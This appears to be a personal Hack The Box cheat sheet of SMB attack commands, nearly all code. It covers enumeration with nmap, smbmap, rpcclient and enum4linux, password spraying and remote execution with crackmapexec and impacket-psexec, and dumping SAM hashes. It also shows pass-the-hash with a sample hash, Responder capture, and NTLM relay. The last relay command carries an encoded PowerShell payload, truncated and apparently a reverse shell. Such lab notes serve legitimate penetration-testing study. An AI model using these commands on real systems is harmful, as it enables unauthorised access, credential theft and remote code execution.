Enumeration
```shell
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

Anonymous Authentication
```shell
smbclient -N -L //10.129.14.128
smbmap -H 10.129.14.128
smbmap -H 10.129.14.128 -r notes # notes atinda bir folde axtariririq
```

Download the folder or file
```shell
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

Remote Procedure Call (RPC)
```shell
rpcclient -U'%' 10.10.110.17
rpcclient $> enumdomusers
```

```shell
./enum4linux-ng.py 10.10.11.45 -A -C
```

Protocol Specifics Attacks
```shell
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

Impacket PsExec
```shell
impacket-psexec administrator:'Password123!'@10.10.110.17
```

CrackMapExec
```shell
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

Enumerating Logged-on Users
```shell
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Extract Hashes from SAM Database
```shell
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

Pass-the-Hash (PtH)
```shell
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Forced Authentication Attacks
```shell
responder -I <interface name>
```

```shell
nijatmansimov@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...
```
























